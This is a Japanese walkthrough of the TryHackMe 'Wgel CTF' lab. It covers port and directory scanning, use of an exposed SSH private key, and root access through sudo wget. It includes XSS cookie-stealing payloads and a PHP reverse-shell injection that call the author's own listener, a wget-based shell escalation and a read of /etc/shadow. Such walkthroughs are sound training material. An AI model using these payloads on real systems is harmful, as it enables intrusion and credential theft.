# Wgel CTF CTF

https://tryhackme.com/r/room/wgelctf

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.118.37

root@ip-10-10-158-58:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-11 01:44 GMT
Nmap scan report for 10.10.118.37
Host is up (0.00039s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:94:93:16:36:23 (Unknown)

root@ip-10-10-158-58:~# sudo nmap -sV -p22,80 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-11 01:44 GMT
Nmap scan report for 10.10.118.37
Host is up (0.00013s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
MAC Address: 02:94:93:16:36:23 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

SSHとHTTP

### gobuster

```shell
root@ip-10-10-158-58:~# gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.118.37
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/sitemap              (Status: 301) [Size: 314] [--> http://10.10.118.37/sitemap/]
/server-status        (Status: 403) [Size: 277]
Progress: 220557 / 220558 (100.00%)
===============================================================
Finished
===============================================================

root@ip-10-10-158-58:~# gobuster dir -x php,txt -u http://$TARGET/sitemap -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.118.37/sitemap
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 321] [--> http://10.10.118.37/sitemap/images/]
/css                  (Status: 301) [Size: 318] [--> http://10.10.118.37/sitemap/css/]
/js                   (Status: 301) [Size: 317] [--> http://10.10.118.37/sitemap/js/]
/fonts                (Status: 301) [Size: 320] [--> http://10.10.118.37/sitemap/fonts/]
/sass                 (Status: 301) [Size: 319] [--> http://10.10.118.37/sitemap/sass/]
Progress: 661671 / 661674 (100.00%)
===============================================================
Finished
===============================================================
```

```html
<!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. -->
Copyright &copy;<script>document.write(new Date().getFullYear());</script> All rights reserved | This template is made with <i class="icon-heart" aria-hidden="true"></i> by <a href="https://colorlib.com" target="_blank">Colorlib</a>
<!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. --><br>
 ```

ColorlibはWordPress関係の何か。

http://10.10.118.37/sitemap/ がホームページでメールのサブスクライブフォームがある。ダミーなので動作しない。  

http://10.10.118.37/sitemap/contact.html にメッセージ送信フォームがある。

## メッセージ送信フォーム

氏名、メールアドレス、タイトルも入力するが、メッセージ本文しか送られてない。

```http
GET /sitemap/contact.html?message=message HTTP/1.1
Host: 10.10.118.37
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://10.10.118.37/sitemap/contact.html
Upgrade-Insecure-Requests: 1
```

### XSS

```javascript
<script>fetch('http://10.2.22.182:1234?cookie=' + btoa(document.cookie) );</script>

<script>document.write('<img src="http://10.2.22.182:1234/' + document.cookie + '">')</script>
```

反応なし。


### リバースシェル

```php
'; exec("/bin/bash -c 'bash -i >/dev/tcp/10.2.22.182/1234 0>&1'"); #
```

反応なし。

Actionが設定されていなかった・・・

```html
<h2>Get In Touch</h2>
    <form action="#">
        <div class="row form-group">
            <div class="col-md-6">
                <!-- <label for="fname">First Name</label> -->
                <input type="text" id="fname" class="form-control" placeholder="Your firstname">
```

## 再gobuster
```shell
root@ip-10-10-158-58:~# gobuster dir -u http://$TARGET/sitemap -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.118.37/sitemap
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.ssh                 (Status: 301) [Size: 319] [--> http://10.10.118.37/sitemap/.ssh/]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/css                  (Status: 301) [Size: 318] [--> http://10.10.118.37/sitemap/css/]
/fonts                (Status: 301) [Size: 320] [--> http://10.10.118.37/sitemap/fonts/]
/images               (Status: 301) [Size: 321] [--> http://10.10.118.37/sitemap/images/]
/js                   (Status: 301) [Size: 317] [--> http://10.10.118.37/sitemap/js/]
Progress: 20473 / 20474 (100.00%)
===============================================================
Finished
===============================================================
```

/.ssh が見つかった。id_rsa を保存。

また、Apacheインストールページに下記のコメントがあった。
```html
 <!-- Jessie don't forget to udate the webiste -->
```

## SSH

```shell
$ ssh -i ./id_rsa jessie@$TARGET
The authenticity of host '10.10.118.37 (10.10.118.37)' can't be established.
ED25519 key fingerprint is SHA256:6fAPL8SGCIuyS5qsSf25mG+DUJBUYp4syoBloBpgHfc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.118.37' (ED25519) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


8 packages can be updated.
8 updates are security updates.

jessie@CorpOne:~$ 
```

```shell
jessie@CorpOne:~$ ls Documents/
user_flag.txt
jessie@CorpOne:~$ cat Documents/user_flag.txt 
057c6...
```
フラグ１ゲット。

## 権限昇格

```shell
jessie@CorpOne:~$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

wgetにsudoが付いている。

```shell
$ TF=$(mktemp)
$ chmod +x $TF
$ echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
$ sudo wget --use-askpass=$TF 0
/usr/bin/wget: unrecognized option '--use-askpass=/tmp/tmp.KxaMh38D4M'
```

このバージョンは--use-askpassオプションが無いので使えなかった。

ファイル名が分かれば、下記のように開けるのだが。

```shell
jessie@CorpOne:~$ sudo /usr/bin/wget -i /root/root.txt
/root/root.txt: No such file or directory
No URLs found in /root/root.txt.
```

SSHキーがあるか？なかった。

```shell
jessie@CorpOne:~$ sudo /usr/bin/wget -i /root/.ssh/id_rsa
/root/.ssh/id_rsa: No such file or directory
No URLs found in /root/.ssh/id_rsa.
```

shadowファイルを読むが、読み取れない。ハッシュが設定されてないかも？

```shell
jessie@CorpOne:~$ sudo /usr/bin/wget -i /etc/shadow
--2025-01-11 05:57:52--  ftp://root/!:18195:0:99999:7:::
           => ‘!:18195:0:99999:7:::’
Resolving root (root)... failed: Name or service not known.
wget: unable to resolve host address ‘root’
--2025-01-11 05:57:52--  ftp://daemon/*:17953:0:99999:7:::
           => ‘.listing’
```

ユーザーフラグが「user_flag.txt」だったので「root_flag.txt」と推測。

```shell
jessie@CorpOne:~$ sudo /usr/bin/wget -i /root/root_flag.txt
--2025-01-11 06:02:20--  http://b1b968.../
Resolving b1b968... (b1b968...)... failed: Name or service not known.
wget: unable to resolve host address ‘b1b968...’
```

ルートフラグゲット！

## 振り返り
- これからは Gobuster で big.txt も使うことにする
- Apacheインストールページのコメントも最初に確認する
- ルートファイルのファイル名がランダムだった場合にクリアできたかは不明
